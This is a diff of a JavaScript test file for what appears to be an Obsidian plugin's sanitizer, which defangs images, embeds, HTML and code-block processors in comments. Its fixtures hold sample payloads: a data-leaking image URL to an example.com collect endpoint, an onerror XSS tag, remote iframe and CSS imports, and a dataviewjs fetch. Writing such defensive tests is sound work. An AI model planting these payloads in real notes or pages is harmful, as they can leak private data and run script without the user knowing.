@@ -4,6 +4,7 @@ import assert from 'node:assert/strict';
 import { build } from 'esbuild';
 import { Window } from 'happy-dom';
 import { unlink } from 'node:fs/promises';
+import { parser } from '@lezer/markdown';
 
 const output = new URL('./.markdown.mjs', import.meta.url);
 await build({
@@ -15,7 +16,7 @@ await build({
   alias: { obsidian: new URL('./host.mjs', import.meta.url).pathname },
   external: ['@codemirror/state'],
 });
-const { CommentMarkdown } = await import(output.href);
+const { CommentMarkdown, safeCommentMarkdown } = await import(output.href);
 after(() => unlink(output));
 
 test('native renderer gets source path and Markdown, latest stream wins, cleanup releases components', async () => {
@@ -120,7 +121,7 @@ x &= y \\
 y &= z
 \end{aligned}$$
 
-` + '```latex\n\\[literal\\]\n```',
+` + '```\n\\[literal\\]\n```',
   );
   renderer.clear();
   await window.happyDOM.close();
@@ -150,4 +151,76 @@ test('skill commands and assistant mentions are highlighted without changing cod
     renderer.clear();
     await window.happyDOM.close();
   }
+});
+
+test('comments disarm image requests, wiki embeds, HTML resources, and named code processors before rendering', async () => {
+  const window = new Window();
+  const body = window.document.createElement('div');
+  const renderer = new CommentMarkdown();
+  const calls = [];
+  const app = {
+    async renderMarkdown(text) {
+      calls.push(text);
+    },
+  };
+  const source = [
+    '**Formatting** and [ordinary link](https://example.com) and [[local note]] and $x^2$.',
+    '![remote](https://example.com/collect?secret=note)',
+    '![reference][remote]',
+    '[remote]: https://example.com/reference.png',
+    '![[private note#section]]',
+    '<img src="https://example.com/image" onerror="alert(1)">',
+    '<iframe src="https://example.com/frame"></iframe>',
+    '<style>@import "https://example.com/style";</style>',
+    '<div>![nested](https://example.com/nested)</div>',
+    '```dataviewjs',
+    'fetch("https://example.com/code");',
+    '```',
+  ].join('\n\n');
+  renderer.paint(app, body, source, 'Fixtures/Annotations.md');
+  await new Promise((resolve) => setTimeout(resolve, 0));
+  const forwarded = calls[0];
+  assert.ok(
+    forwarded.includes(
+      '**Formatting** and [ordinary link](https://example.com) and [[local note]] and $x^2$.',
+    ),
+  );
+  assert.ok(forwarded.includes('\\!\\[remote\\]'));
+  assert.ok(forwarded.includes('\\![[private note') || forwarded.includes('\\!\\[\\[private note'));
+  assert.ok(forwarded.includes('&lt;img'));
+  assert.ok(!forwarded.includes('```dataviewjs'));
+  assert.ok(forwarded.includes('fetch("https://example.com/code");'));
+  const active = [];
+  parser.parse(forwarded).iterate({
+    enter(node) {
+      if (['InlineCode', 'FencedCode', 'CodeBlock'].includes(node.name)) {
+        assert.equal(node.node.getChild('CodeInfo'), null);
+        return false;
+      }
+      if (['Image', 'HTMLBlock', 'HTMLTag'].includes(node.name)) active.push(node.name);
+    },
+  });
+  assert.deepEqual(active, []);
+  assert.ok(source.includes('```dataviewjs'));
+  assert.ok(source.includes('<img src='));
+  renderer.clear();
+  await window.happyDOM.close();
+});
+
+test('sanitizing preserves literal examples inside code and strips nested and unclosed fence processors', () => {
+  const inline = '`![image](https://example.com) ![[note]] <img src=x>`';
+  const indented = '    ![image](https://example.com) ![[note]] <img src=x>';
+  assert.equal(safeCommentMarkdown(inline), inline);
+  assert.equal(safeCommentMarkdown(indented), indented);
+  assert.equal(
+    safeCommentMarkdown('```dataviewjs\n![[note]] <img src=x>\n```'),
+    '```\n![[note]] <img src=x>\n```',
+  );
+  assert.equal(
+    safeCommentMarkdown('> ~~~mermaid\n> graph TD; a-->b\n> ~~~'),
+    '> ~~~\n> graph TD; a-->b\n> ~~~',
+  );
+  assert.equal(safeCommentMarkdown('```dataviewjs\nfetch("secret")'), '```\nfetch("secret")');
+  assert.equal(safeCommentMarkdown('\\![[escaped]]'), '\\![[escaped]]');
+  assert.equal(safeCommentMarkdown('![[unfinished embed'), '\\![[unfinished embed');
 });
